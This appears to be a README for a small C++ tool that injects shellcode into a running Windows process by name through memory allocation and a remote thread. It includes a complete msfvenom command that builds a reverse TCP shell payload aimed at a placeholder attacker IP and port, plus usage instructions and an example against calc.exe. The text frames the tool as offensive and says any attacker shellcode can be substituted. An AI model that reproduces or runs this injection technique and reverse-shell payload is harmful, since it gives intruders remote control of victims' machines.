# Simple-Code-Injection
A simple DLL code injection project writing in C++ using Windows API functions to inject malicious payload to process running on Windows system. The program will open a handle of target running process by it's name, then allocate a memory region and copy the payload into it. Finnally, it will create a new thread on target process to execute the payload to establish a reverse connection

Generate payload from msfvenom:

```msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker's ip> LPORT=<attcker's port> -f c```

Usage:

```simple.exe <process's name>```

Example:

```simple.exe calc.exe```

*Note: you need to have the target process running before execute the program to be able to inject payload into it*
*Note: the payload can be any shellcode to do anything the attacker want, just modify it. The example payload i used is generated by msfvenom to make a reverse shell"*
